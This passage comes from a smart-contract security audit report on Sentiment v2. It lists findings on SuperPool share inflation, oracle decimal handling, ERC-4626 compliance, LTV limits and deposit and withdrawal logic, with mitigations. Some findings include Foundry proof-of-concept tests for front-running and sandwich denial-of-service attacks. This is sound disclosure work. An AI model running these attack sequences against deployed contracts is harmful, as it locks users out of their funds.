[deploySuperPool](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPoolFactory.sol#L56):

```solidity
    function deploySuperPool(
        address owner,
        address asset,
        address feeRecipient,
        uint256 fee,
        uint256 superPoolCap,
        uint256 initialDepositAmt,
        string calldata name,
        string calldata symbol
    ) external returns (address) {
        if (fee != 0 && feeRecipient == address(0)) revert SuperPoolFactory_ZeroFeeRecipient();
@>      SuperPool superPool = new SuperPool(POOL, asset, feeRecipient, fee, superPoolCap, name, symbol);
        superPool.transferOwnership(owner);
        isDeployerFor[address(superPool)] = true;

        // burn initial deposit
        IERC20(asset).safeTransferFrom(msg.sender, address(this), initialDepositAmt); // assume approval
        IERC20(asset).approve(address(superPool), initialDepositAmt);
@>      uint256 shares = superPool.deposit(initialDepositAmt, address(this));
@>      if (shares < MIN_BURNED_SHARES) revert SuperPoolFactory_TooFewInitialShares(shares);
        IERC20(superPool).transfer(DEAD_ADDRESS, shares);

        emit SuperPoolDeployed(owner, address(superPool), asset, name, symbol);
        return address(superPool);
    }
```

Note that `uint256 public constant MIN_BURNED_SHARES = 1000;`

An attacker can frontrun this transaction from a regular user and donate to the already known `address` a small amount of the `SuperPool`'s selected asset to inflate the shares and make them very expensive for the user to create the `SuperPool` (exact numbers shown in the coded PoC).

The shares inflation happens because of the [`_convertToShares`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L456) function used in the [`deposit`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L258) function:

```solidity
    function deposit(uint256 assets, address receiver) public nonReentrant returns (uint256 shares) {
        accrue();
@>      shares = _convertToShares(assets, lastTotalAssets, totalSupply(), Math.Rounding.Down);
        if (shares == 0) revert SuperPool_ZeroShareDeposit(address(this), assets);
        _deposit(receiver, assets, shares);
    }
```
```solidity
    function _convertToShares(
        uint256 _assets,
        uint256 _totalAssets,
        uint256 _totalShares,
        Math.Rounding _rounding
    ) public view virtual returns (uint256 shares) {
        shares = _assets.mulDiv(_totalShares + 1, _totalAssets + 1, _rounding);
    }
```

Normally a user would only need `1000 assets` to mint `1000 shares` (1000 * 1 / 1 = 1000 shares using the `_convertToShares` formula above). Imagine a donation of `1000000 assets` before the transaction. Now `1000 assets` would give `0 shares` (1000 * 1 / 1000001 = 0 shares). With a token like `USDC` which has 6 decimals and is in scope, a user would need $1000 to overcome a $1 donation and mint `1000 shares`.



### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. Attacker calculates the address of the next `SuperPool`.
2. User sends a transaction to create a `SuperPool`.
3. Attacker frontruns this transaction and donates a small amount of the user's specified `SuperPool` asset.
4. User's transaction fails due to not enough dead shares minted.
5. It is now very expensive to create that specific `SuperPool`.

### Impact

It will become very expensive to create a `SuperPool`, many users won't want to do it and `SuperPools` will stop getting created.

### PoC

Paste the following code in the `test/core/Superpool.t.sol` test file and follow the comments:

```solidity
    function testSuperPoolDOS() public {
        // Let's say that the asset is USDC which has 6 decimals and assume 1 USDC = $1
        asset1.mint(user, 10 ether);
        asset1.mint(user2, 10 ether);

        // User has calculated the address of the next SuperPool and donates 1 USDC before the creation transaction
        vm.prank(user);
        asset1.transfer(0x1cEE5337E266BACD38c2a364b6a65D8fD1476f14, 1_000_000);

        vm.prank(user2);
        asset1.approve(address(superPoolFactory), 10 ether);

        // Error selectors to be used with the vm.expectReverts
        bytes4 selectorFactory = bytes4(keccak256("SuperPoolFactory_TooFewInitialShares(uint256)"));
        bytes4 selectorSuperPool = bytes4(keccak256("SuperPool_ZeroShareDeposit(address,uint256)"));

        // Deposit amounts
        uint256 normalMinAmount = 1000;
        uint256 oneThousandUSDC = 1_000_000_000;

        // user2 tries to create a SuperPool sending the supposed min amount of 1000, it reverts because he minted 0
        // shares
        vm.prank(user2);
        vm.expectRevert(abi.encodeWithSelector(selectorSuperPool, 0x1cEE5337E266BACD38c2a364b6a65D8fD1476f14, 1000));
        superPoolFactory.deploySuperPool(
            user2, address(asset1), user2, 0.01 ether, type(uint256).max, normalMinAmount, "test", "test"
        );

        // user2 tries to create a SuperPool sending 1000 USDC, it reverts because he minted 999 shares
        vm.prank(user2);
        vm.expectRevert(abi.encodeWithSelector(selectorFactory, 999));
        superPoolFactory.deploySuperPool(
            user2, address(asset1), user2, 0.01 ether, type(uint256).max, oneThousandUSDC, "test", "test"
        );

        // Here is a test to prove that SuperPool creation is NOT dependant on block.timestamp, block.number, address
        // calling the transaction or function parameters
        // All of these are changed and the transaction fails with the same error message because it still creates the
        // SuperPool at the same address as befores
        vm.prank(user);
        asset1.approve(address(superPoolFactory), 10 ether);
        vm.warp(block.timestamp + 45_914_891);
        vm.roll(block.number + 100);

        vm.prank(user);
        vm.expectRevert(abi.encodeWithSelector(selectorFactory, 999));
        superPoolFactory.deploySuperPool(
            user, address(asset1), user, 0.01 ether, type(uint256).max, oneThousandUSDC, "test1", "test1"
        );

        // user2 sends the transaction with 1001 USDC, it is now succesful since it minted the required 1000 shares
        vm.prank(user2);
        superPoolFactory.deploySuperPool(
            user2, address(asset1), user2, 0.01 ether, type(uint256).max, 1_001_000_000, "test", "test"
        );
    }
```

### Mitigation

Don't require from the user to deposit and actually mint the dead shares. You can hardcode them in the `SuperPool` contract by making for e.g.:

1. The `totalAssets` function to return the actual total assets + 1000
2. The `totalSupply` function to return the actual total supply + 1000

# Issue M-7: LTV of 98% would be extremely dangerous 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/102 

## Found by 
X12
## Summary
Having an LTV of 98% that pools can set is really dangerous as it doesn't take into account that oracle prices have the so called deviation, which can be anywhere from 0.25% to 2%. Meaning that the actual LTV would be `LTV + oracle1 deviation + oracle2 deviation`, which can result in `> 100% LTV`.

## Vulnerability Detail
The README gives us a range for the possible LTV.

> Min LTV = 10% = 100000000000000000
Max LTV = 98% = 980000000000000000

However this range reaches up to 98% which is extremely dangerous, no matter the asset, even if the supply-borrowing pair is stable coins. 

Example oracles:
[stETH : ETH](https://data.chain.link/feeds/ethereum/mainnet/steth-eth) - 0.5% deviation
[DAI : ETH](https://data.chain.link/feeds/ethereum/mainnet/dai-eth)       - 1% deviation
[USDC : ETH](https://data.chain.link/feeds/ethereum/mainnet/usdc-eth) - 1% deviation
[USDT : ETH](https://data.chain.link/feeds/ethereum/mainnet/usdt-eth)  - 1% deviation

Both assets may be denominated in ETH, but their value is compared one to one, meaning that a user can deposit USDC to his position and borrow USDT from a pool, where both prices would be compared in terms of ETH. They will not take effect from the price of ETH, but will be effected by the extra oracle deviation, as ETH is generally around 1% - 2% and stable coins to USD are around 0.1% ([DAI : USD](https://data.chain.link/feeds/arbitrum/mainnet/dai-usd), [USDC : USD](https://data.chain.link/feeds/arbitrum/mainnet/usdc-usd), and so on... )

However with the above example we can see such a pool having actual LTV of 100%, as USDC can be 0.99 and USDT 1.01 with the oracle reporting both prices as 1.00 USD. In this case the pool will have 100% LTV allowing borrowers to borrow 100% of the pool causing a DOS and potentially adding some bad debt to the system. This would also distinctiveness liquidators a they won't have any profit from liquidating these positions (once the price normalizes) and may even be on a loss.

Example of similar scenario is the recent depeg on `ezETH` causing Mrpho to socialize some bad debt, even with reasonable LTV parameters -  [link](https://forum.morpho.org/t/gauntlet-lrt-core-vault-market-update-4-24-2024-ezeth-price-volatility/578).

## Impact
LTV of 100% or even above would result in lenders losing their funds, as borrowers would not be incentivized to pay of their loans or would prefer to get liquidated if the price moves to their favor. Liquidators will not liquidate as they would be in a loss. 

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskEngine.sol#L190
```solidity
    function acceptLtvUpdate(uint256 poolId, address asset) external {
        if (msg.sender != pool.ownerOf(poolId)) revert RiskEngine_OnlyPoolOwner(poolId, msg.sender);

        LtvUpdate memory ltvUpdate = ltvUpdateFor[poolId][asset];

        // revert if there is no pending update
        if (ltvUpdate.validAfter == 0) revert RiskEngine_NoLtvUpdate(poolId, asset);

        // revert if called before timelock delay has passed
        if (ltvUpdate.validAfter > block.timestamp) revert RiskEngine_LtvUpdateTimelocked(poolId, asset);

        // revert if timelock deadline has passed
        if (block.timestamp > ltvUpdate.validAfter + TIMELOCK_DEADLINE) {
            revert RiskEngine_LtvUpdateExpired(poolId, asset);
        }

        // apply changes
        ltvFor[poolId][asset] = ltvUpdate.ltv;
        delete ltvUpdateFor[poolId][asset];
        emit LtvUpdateAccepted(poolId, asset, ltvUpdate.ltv);
    }
```
## Tool used
Manual Review

## Recommendation
Have a lower max LTV.

# Issue M-8: Improper handling of price normalization to `e18` in `RedstoneOracle.sol#getValueInEth` 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/103 

## Found by 
Anirruth, MVKsentry
### Summary

The RedstoneOracle#getValueInEth returns price of `ASSSETe18` mutiplied by `(ASSET/USD) / (ETH/USD)`which are gotten from Redstone Oracles and not scaled to 18 decimals as the `ASSET`.

The problem is that Redstone Oracles are 8 decimals by default which can be seen here [Redstone price feeds decimals](https://github.com/redstone-finance/redstone-oracles-monorepo/blob/9d10a48aad7a2ccb5f3f48396d970fd63761dbce/packages/on-chain-relayer/contracts/price-feeds/PriceFeedBase.sol#L51-L53)

### Root Cause

The issue itself lies in the normalization to `e18` of the returned by the method price.

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/oracle/RedstoneOracle.sol#L67-L71

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Financial losses due to inaccuracy in the math.

### PoC

As per openzeppelin math [mulDiv function parameters](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/0b58a783b9b33b63eef2994af8958c0c6a72dc51/contracts/utils/math/Math.sol#L144)
x = amt: Scaled to 18 decimals.
y = assetUsdPrice: 8 decimals.
denominator = ethUsdPrice: 8 decimals.

The calculation performed by the `getValueInEth` function is:
```math

\text{Result} = \frac{\text{amt} \times \text{assetUsdPrice}}{\text{ethUsdPrice}}
```

Substituting the values:
```math
\text{Result} = \frac{(1 \times 10^{18}) \times (1 \times 10^{8})}{2 \times 10^{8}}
```

Simplifying the expression:
```math
\text{Result} = \frac{1 \times 10^{26}}{2 \times 10^{8}} = \frac{1 \times 10^{26}}{2 \times 10^{8}} = 0.5 \times 10^{18} = 5 \times 10^{17}
```
Thus, the function will return:
```math
`\boxed{5 \times 10^{17}}
```

### Mitigation

Consider normalizing the prices of `assetUsdPrice, ethUsdPrice` to `1e18` OR the `asset` price to `1e8` and after that the calculation outcome value to `1e18`


# Issue M-9: The `SuperPool` vault is not strictly ERC4626 compliant as it should be 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/110 

The protocol has acknowledged this issue.

## Found by 
0xAadi, 4gontuk, EgisSecurity, Kalogerone, Obsidian, Ryonen, hash, iamandreiski
### Summary

The contest [README](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/README.md?plain=1#L49) file clearly states that:

> Q: Is the codebase expected to comply with any EIPs? Can there be/are there any deviations from the specification?

> `SuperPool.sol` is strictly ERC4626 compliant

No deviations from the specification mentioned. The `SuperPool.sol` contract is not strictly ERC4626 compliant according to the [EIP docs](https://eips.ethereum.org/EIPS/eip-4626).

### Root Cause

The [EIP docs](https://eips.ethereum.org/EIPS/eip-4626) for the `convertToShares` and `convertToAssets` functions state:

> MUST NOT be inclusive of any fees that are charged against assets in the Vault.

and later also state:

> The `convertTo` functions serve as rough estimates that do not account for operation specific details like withdrawal fees, etc. They were included for frontends and applications that need an average value of shares or assets, not an exact value possibly including slippage or _**other fees.**_ For applications that need an exact value that attempts to account for fees and slippage we have included a corresponding preview function to match each mutable function. These functions must not account for deposit or withdrawal limits, to ensure they are easily composable, the max functions are provided for that purpose.

However, `SuperPool`'s [`convertToShares`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L194) and [`convertToAssets`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L202) also calculate and include any new fees accrued.

```solidity
    /// @notice Converts an asset amount to a share amount, as defined by ERC4626
    /// @param assets The amount of assets
    /// @return shares The equivalent amount of shares
    function convertToShares(uint256 assets) public view virtual returns (uint256 shares) {
 @>     (uint256 feeShares, uint256 newTotalAssets) = simulateAccrue();
 @>     return _convertToShares(assets, newTotalAssets, totalSupply() + feeShares, Math.Rounding.Down);
    }

    /// @notice Converts a share amount to an asset amount, as defined by ERC4626
    /// @param shares The amount of shares
    /// @return assets The equivalent amount of assets
    function convertToAssets(uint256 shares) public view virtual returns (uint256 assets) {
@>      (uint256 feeShares, uint256 newTotalAssets) = simulateAccrue();
@>      return _convertToAssets(shares, newTotalAssets, totalSupply() + feeShares, Math.Rounding.Down);
    }
```

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

The `SuperPool` is not strictly EIP-4626 compliant as the README file states it should be.

### PoC

_No response_

### Mitigation

Don't calculate any new fees accrued in the `external convertTo` functions:

```diff
    function convertToShares(uint256 assets) public view virtual returns (uint256 shares) {
-       (uint256 feeShares, uint256 newTotalAssets) = simulateAccrue();
-       return _convertToShares(assets, newTotalAssets, totalSupply() + feeShares, Math.Rounding.Down);
+       return _convertToShares(assets, totalAssets(), totalSupply(), Math.Rounding.Down);
    }

    function convertToAssets(uint256 shares) public view virtual returns (uint256 assets) {
-       (uint256 feeShares, uint256 newTotalAssets) = simulateAccrue();
-       return _convertToAssets(shares, newTotalAssets, totalSupply() + feeShares, Math.Rounding.Down);
+       return _convertToAssets(shares, totalAssets(), totalSupply(), Math.Rounding.Down);
    }
```

# Issue M-10: An attacker can permanently DOS lender from withdrawing by a sandwich attack 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/127 

The protocol has acknowledged this issue.

## Found by 
Obsidian
### Summary

If a user borrows and repays a loan within the same block they do not pay any interest

Therefore an attacker can sandwich a lender trying to withdraw funds by borrowing those funds, to ensure the lender's tx reverts and then backrunning the lender's withdraw tx by repaying those funds, all within the same block to ensure 0 interest.

### Root Cause

No intra-block interest accumulation

Allowing intrablock borrow and repays

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. Lender sends a tx to [withdraw](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/Pool.sol#L339) funds
2. Frontrun (1) by depositing collateral and then borrowing an amount of assets to make (1) revert
3. Backrun the reverted Tx by repaying the loan all within the same block to ensure no interest accumulates

### Impact

Attacker can permanently DOS a lender withdrawing their funds, the cost of the attack is only the gas cost of the tx

### PoC

Add the following to `BigTest.t.sol`

```solidity
function test__BorrowerFrontRunsLenderWithdrawal() public {
    uint256 depositAmount = 100 ether;
    uint256 borrowAmount = 100 ether;

    // Lender deposits
    vm.startPrank(lender);
    asset1.mint(lender, depositAmount);
    asset1.approve(address(pool), depositAmount);
    pool.deposit(linearRatePool, depositAmount, lender);
    vm.stopPrank();

    // Attacker setup
    vm.startPrank(user);
    (address position, Action memory newPositionAction) = newPosition(user, "test-position");
    positionManager.process(position, newPositionAction);

    // Simulate front-running: 
    // Attacker deposits collateral
    // Attacker borrows all available funds
    asset2.mint(user, 200 ether);
    asset2.approve(address(positionManager), 200 ether);
    Action[] memory setupActions = new Action[](2);
    setupActions[0] = addToken(address(asset2));
    setupActions[1] = deposit(address(asset2), 200 ether);
    positionManager.processBatch(position, setupActions);

    Action memory borrowAction = borrow(linearRatePool, borrowAmount);
    positionManager.process(position, borrowAction);
    vm.stopPrank();

    // Lender attempts to withdraw, which will revert
    vm.prank(lender);
    vm.expectRevert(abi.encodeWithSelector(Pool.Pool_InsufficientWithdrawLiquidity.selector, linearRatePool, 0, depositAmount));
    pool.withdraw(linearRatePool, depositAmount, lender, lender);

    // Attacker repays the full amount, without paying any interest
    vm.startPrank(user);
    asset1.approve(address(positionManager), borrowAmount);
    Action memory repayAction = Action({
        op: Operation.Repay,
        data: abi.encode(linearRatePool, borrowAmount)
    });
    positionManager.process(position, repayAction);
    vm.stopPrank();
```

Console output:

```bash
Ran 1 test for test/integration/BigTest.t.sol:BigTest
[PASS] test__BorrowerFrontRunsLenderWithdrawal() (gas: 783412)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.61ms (815.19µs CPU time)

Ran 1 test suite in 5.94ms (4.61ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Mitigation

1. Implement intra-block interest accumulation to make this expensive for the attacker
2. Implement a time interval between deposits and repays

# Issue M-11: SuperPool doesn't strictly comply with ERC-4626. 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/129 

## Found by 
S3v3ru5, dany.armstrong90
## Summary
`SuperPool.maxWithdraw()` and `SuperPool.maxRedeem()` functions returns incorrect values.
This means `SuperPool` doesn't strictly comply with ERC-4626.

## Vulnerability Detail
`SuperPool.maxWithdraw()` and `SuperPool.maxRedeem()` functions calls the following `_maxWithdraw()` function.
```solidity
    function _maxWithdraw(address _owner, uint256 _totalAssets, uint256 _totalShares) internal view returns (uint256) {
        uint256 totalLiquidity; // max assets that can be withdrawn based on superpool and underlying pool liquidity
        uint256 depositQueueLength = depositQueue.length;
        for (uint256 i; i < depositQueueLength; ++i) {
478:        totalLiquidity += POOL.getLiquidityOf(depositQueue[i]);
        }
        totalLiquidity += ASSET.balanceOf(address(this)); // unallocated assets in the superpool

        // return the minimum of totalLiquidity and _owner balance
483:    uint256 userAssets = _convertToAssets(ERC20.balanceOf(_owner), _totalAssets, _totalShares, Math.Rounding.Down);
484:    return totalLiquidity > userAssets ? userAssets : totalLiquidity;
    }
```
As can be seen, the above function use liquidity of pool as withdrawable maximum assets in `L478`.

On the other hand, `SuperPool.withdraw()` and `SuperPool.redeem()` function calls `_withdraw()` function and `_withdraw()` function calls in turn the following `_withdrawFromPools()` function to withdraw assets from deposited pools.
```solidity
548:function _withdrawFromPools(uint256 assets) internal {
        uint256 assetsInSuperpool = ASSET.balanceOf(address(this));

        if (assetsInSuperpool >= assets) return;
        else assets -= assetsInSuperpool;

        uint256 withdrawQueueLength = withdrawQueue.length;
        for (uint256 i; i < withdrawQueueLength; ++i) {
            uint256 poolId = withdrawQueue[i];
            // withdrawAmt -> max assets that can be withdrawn from the underlying pool
            // optimistically try to withdraw all assets from this pool
            uint256 withdrawAmt = assets;

            // withdrawAmt cannot be greater than the assets deposited by the pool in the underlying pool
            uint256 assetsInPool = POOL.getAssetsOf(poolId, address(this));
563:        if (assetsInPool < withdrawAmt) withdrawAmt = assetsInPool;

            // withdrawAmt cannot be greater than the underlying pool liquidity
            uint256 poolLiquidity = POOL.getLiquidityOf(poolId);
567:        if (poolLiquidity < withdrawAmt) withdrawAmt = poolLiquidity;

            if (withdrawAmt > 0) {
                try POOL.withdraw(poolId, withdrawAmt, address(this), address(this)) {
                    assets -= withdrawAmt;
                } catch { }
            }

            if (assets == 0) return;
        }

        // We explicitly check assets == 0, and if so return, otherwise we revert directly here
        revert SuperPool_NotEnoughLiquidity(address(this));
    }
```
As can be seen, the above function use minimum of `assetsInPool` and `poolLiquidity` as withdrawable maximum assets (`L563` and `L567`) which is less than the value of `_maxWithdraw()` function.

PoC:
1. `pool1` has `100` total deposited shares, `1000` total deposited assets and `500` total borrowed assets. So `pool1` has `1000 - 500` liquidity.
2. `pool2` has `100` total deposited shares, `1000` total deposited assets and `1000` total borrowed assets. So `pool2` has `1000 - 1000 = 0` liquidity.
3. `SuperPool` has `10` shares in the `pool1` and `10` shares in the `pool2`.
4. `SuperPool` has `100` total supply(total shares) and a user has `100` shares in `SuperPool` which means that the user has `100%` shares of `SuperPool`.
5. Therefore the user and `SuperPool` has `10 * 1000 / 100 + 10 * 1000 / 100 = 200` total assets in the underlying pools which is equal to `userAssets` of `L483` and `assets` of `L548`.
6. `totalLiquidity` of `L484` is `0 + 500 = 500` and `_maxWithdraw()` returns `min(200, 500) = 200`.
7. `withdrawAmt` of `L567` is `min(500, 100) = 100` for `pool1` and `min(0, 100) = 0` for `pool2`. Therefore `_withdrawFromPools()` function withdraw totally `100` assets from underlying pools which is smaller than `200` of `_maxWithdraw()` function.

## Impact
The `README.md#L161` stated as follows.
```md
SuperPool.sol is strictly ERC4626 compliant
```
However SuperPool doesn't strictly comply with ERC-4626.

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L478

## Tool used

Manual Review

## Recommendation
Modify `SuperPool._maxWithdraw()` function as follows.
```solidity
    function _maxWithdraw(address _owner, uint256 _totalAssets, uint256 _totalShares) internal view returns (uint256) {
        uint256 totalLiquidity; // max assets that can be withdrawn based on superpool and underlying pool liquidity
        uint256 depositQueueLength = depositQueue.length;
        for (uint256 i; i < depositQueueLength; ++i) {
--          totalLiquidity += POOL.getLiquidityOf(depositQueue[i]);
++          totalLiquidity += Math.min(POOL.getLiquidityOf(depositQueue[i]), POOL.getAssetsOf(depositQueue[i], address(this)));
        }
        totalLiquidity += ASSET.balanceOf(address(this)); // unallocated assets in the superpool

        // return the minimum of totalLiquidity and _owner balance
        uint256 userAssets = _convertToAssets(ERC20.balanceOf(_owner), _totalAssets, _totalShares, Math.Rounding.Down);
        return totalLiquidity > userAssets ? userAssets : totalLiquidity;
    }
```

# Issue M-12: Incorrect check in validateBadDebt function 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/137 

The protocol has acknowledged this issue.

## Found by 
Smacaud, bareli, pseudoArtist
## Summary

The validateBadDebt functions allows positions where assets equal debt to be classified as not in bad debt. This behavior affects the liquidateBadDebt function, which relies on this validation to determine whether a position should be liquidated.

## Vulnerability Detail

The validateBadDebt function only reverts when totalAssetValue exceeds totalDebtValue depicting no bad debt

`  function validateBadDebt(address position) external view {
       // ......Existing codes.....
        if (totalAssetValue > totalDebtValue) revert RiskModule_NoBadDebt(position);
    }`

However, if totalAssetValue = totalDebtValue, the function does not revert and incorrectly considers the position as being in bad debt. 

This can lead to case where totalAssetValue = totalDebtValue is being considered as bad debt which is technically not. The owner can go ahead to liquidate the position thinking its bad debt because of the incorrect check. 

## Impact

The implementation could lead to unfair liquidations of positions that are technically not in bad debt (case of totalAssetValue = totalDebtValue )

## Code Snippet

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskModule.sol#L126

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L447

## Tool used

Manual Review

## Recommendation

Adjust the validateBadDebt function to handle the scenario where totalAssetValue is equal to totalDebtValue more accurately.

# Issue M-13: `SuperPool` fails to correctly deposit into pools 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/178 

## Found by 
0xDazai, Atharv, Bigsam, KupiaSec, Yuriisereda
## Summary

When a depositor calls `SuperPool::deposit()` the internal `_deposit()` is called, it checks if `astTotalAssets + assets > superPoolCap` , transfers the assets from `msg.sender` to `superPool address` , mints `shares` to `receiver` and then calls `_supplyToPools()`. 

[SuperPool::_deposit()](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/SuperPool.sol#L497-L506)
```solidity
    function _deposit(address receiver, uint256 assets, uint256 shares) internal {
        // assume that lastTotalAssets are up to date
        if (lastTotalAssets + assets > superPoolCap) revert SuperPool_SuperPoolCapReached();
        // Need to transfer before minting or ERC777s could reenter.
        ASSET.safeTransferFrom(msg.sender, address(this), assets);
        ERC20._mint(receiver, shares);
        _supplyToPools(assets);    <<<@
        lastTotalAssets += assets;
        emit Deposit(msg.sender, receiver, assets, shares);
    }
```

[SuperPool::_supplyToPools()](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/SuperPool.sol#L524-L543)

```solidity
    function _supplyToPools(uint256 assets) internal {
        uint256 depositQueueLength = depositQueue.length;
        for (uint256 i; i < depositQueueLength; ++i) {
            uint256 poolId = depositQueue[i];
            uint256 assetsInPool = POOL.getAssetsOf(poolId, address(this));  <<<@


            if (assetsInPool < poolCapFor[poolId]) {
                uint256 supplyAmt = poolCapFor[poolId] - assetsInPool;
                if (assets < supplyAmt) supplyAmt = assets;
                ASSET.forceApprove(address(POOL), supplyAmt);


                // skip and move to the next pool in queue if deposit reverts
                try POOL.deposit(poolId, supplyAmt, address(this)) {
                    assets -= supplyAmt;
                } catch { }


                if (assets == 0) return;
            }
        }
    }
```

`_supplyToPools()` loops through all pools, depositing assets sequentially until the cap is reached. When it checks if the `cap of the poolId` is reached instead of comparing the `total deposit assets amount` of the `poolId` with the  `pool.poolCap` to see if there is a free space for depositing into, it only compares the total assets deposited by the `SuperPool address` into the `poolId` with `poolCapFor[poolId] mapping ` set by the `owner of the SuperPool` when the pool was added by calling `addPool()` and subtract the result with the wanted asset value for depositing. 

## Vulnerability Detail

When calculating if there is a free space for depositing into the `poolId` by calling `uint256 assetsInPool = POOL.getAssetsOf(poolId, address(this));` it can return bigger value than the actual one left in the `pool.poolCap` , increasing the chances of `deposit()` function for the `poolId` to revert, unsuccessfully filling up the left space in the `poolId`  before moving forward to the next `poolId` if there is any asset amount left. 

## Impact

Fails to correctly fill up assets into pools even if there is any free space to do so.

## Code Snippet

```solidity
    function _supplyToPools(uint256 assets) internal {
        uint256 depositQueueLength = depositQueue.length;
        for (uint256 i; i < depositQueueLength; ++i) {
            uint256 poolId = depositQueue[i];
            uint256 assetsInPool = POOL.getAssetsOf(poolId, address(this));


            if (assetsInPool < poolCapFor[poolId]) {
                uint256 supplyAmt = poolCapFor[poolId] - assetsInPool;
                if (assets < supplyAmt) supplyAmt = assets;
                ASSET.forceApprove(address(POOL), supplyAmt);


                // skip and move to the next pool in queue if deposit reverts
                try POOL.deposit(poolId, supplyAmt, address(this)) {
                    assets -= supplyAmt;
                } catch { }


                if (assets == 0) return;
            }
        }
    }
```
## PoC

Lets look at the following example:

1. Owner of `poolId = 1` creates the pool and sets `poolCap = 2000 USDC`
2. In `SuperPool` `poolId = 1` is added to the contract with `poolCapFor[poolId] = 1500` . 
3. Alice deposits 1000 USDC to `poolId = 1` by calling `SuperPool.deposit()`.
 a) Now the `poolCapFor[poolId] ` free space is 500 USDC.
 b) And `poolCap free space for poolId = 1` is 1000 USDC.
4. Bob calls directly `Pool.deposit()` for `poolId = 1` with 600 USDC , and `poolCap free space for poolId = 1` is 400USDC.
5. John calls `SuperPool.deposit()` with 500 USDC and it will try to deposit into `poolId = 1` because `poolCapFor[poolId] free space = 500` , but `poolCap free space = 400`, the tx will revert for that poolId and will move forward and try to deposit into the next pool even when there is free space for 400 USDC . 

## Tool used

Manual Review

## Recommendation

In Pool.sol add :

```diff
+    function getPoolCap(uint256 poolId) public view returns(uint256) {
+        return poolDataFor[poolId].poolCap;
+    }
```
And in SuperPool.sol

```diff
    function _supplyToPools(uint256 assets) internal {
        uint256 depositQueueLength = depositQueue.length;
        for (uint256 i; i < depositQueueLength; ++i) {
            uint256 poolId = depositQueue[i];
+            uint256 capLeft = pool.getPoolCap(poolId) - pool.getTotalAssets(poolId);
            uint256 assetsInPool = POOL.getAssetsOf(poolId, address(this));

                if (assetsInPool < poolCapFor[poolId]) {
                uint256 supplyAmt = poolCapFor[poolId] - assetsInPool;
                if (assets < supplyAmt) supplyAmt = assets;
+                If(supplyAmt > capLeft){
+                    supplyAmt = capLeft;
                ASSET.forceApprove(address(POOL), supplyAmt);
+                } else {
+                    ASSET.forceApprove(address(POOL), supplyAmt);
+                }
                // skip and move to the next pool in queue if deposit reverts
                try POOL.deposit(poolId, supplyAmt, address(this)) {
                    assets -= supplyAmt;
                } catch { }

                if (assets == 0) return;
            }
        }
    }
```

# Issue M-14: Denial of Service (DoS) Vulnerability in SuperPool Withdrawal Due to Precision Loss (shares=0) in Pool Share Calculations when we call withdraw in pool contract. 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/179 

## Found by 
Bigsam
## Summary

The SuperPool contract contains a vulnerability that can cause a Denial of Service (DoS) for users attempting to withdraw their funds. Although the SuperPool may have enough liquidity, precision loss in pool share calculations can lead to failed withdrawals, preventing users from accessing their funds.

## Vulnerability Detail
When a user attempts to withdraw funds from the SuperPool, the `_withdrawFromPools` function loops through the various pools to gather the required assets. The function calls the `withdraw` function in each pool contract, which calculates the deposit shares to burn. Due to precision loss, the calculation may result in zero shares to burn, causing the withdrawal to revert. This issue occurs even when the pool has sufficient liquidity to cover the transaction, leading to a failed withdrawal despite the availability of funds.

```solidity
 
    function _withdraw(address receiver, address owner, uint256 assets, uint256 shares) internal {

@audit>> calll >>        _withdrawFromPools(assets);
    
    if (msg.sender != owner) ERC20._spendAllowance(owner, msg.sender,
```
```solidity

    function _withdrawFromPools(uint256 assets) internal {
        uint256 assetsInSuperpool = ASSET.balanceOf(address(this));

        if (assetsInSuperpool >= assets) return;
        else assets -= assetsInSuperpool;


// loop through  
 uint256 withdrawQueueLength = withdrawQueue.length;
        for (uint256 i; i < withdrawQueueLength; ++i) {


   @audit>> as long as amount is greater than 0 even if this is 1 wei >>    if (withdrawAmt > 0) {
           
                                                             try POOL.withdraw(poolId, withdrawAmt, address(this), address(this)) {

   @audit>> reduce asset for the next withdrawal>>                 assets -= withdrawAmt;
              
  } catch { }
            }

            if (assets == 0) return;
        }

```
The vulnerability arises because the `withdraw` function in the pool contract uses the following logic:


```solidity


    @audit>> if 1 wei or less enough shares = 0 >>       shares = _convertToShares(assets, pool.totalDepositAssets, pool.totalDepositShares, Math.Rounding.Up);
 
// check for rounding error since convertToShares
 
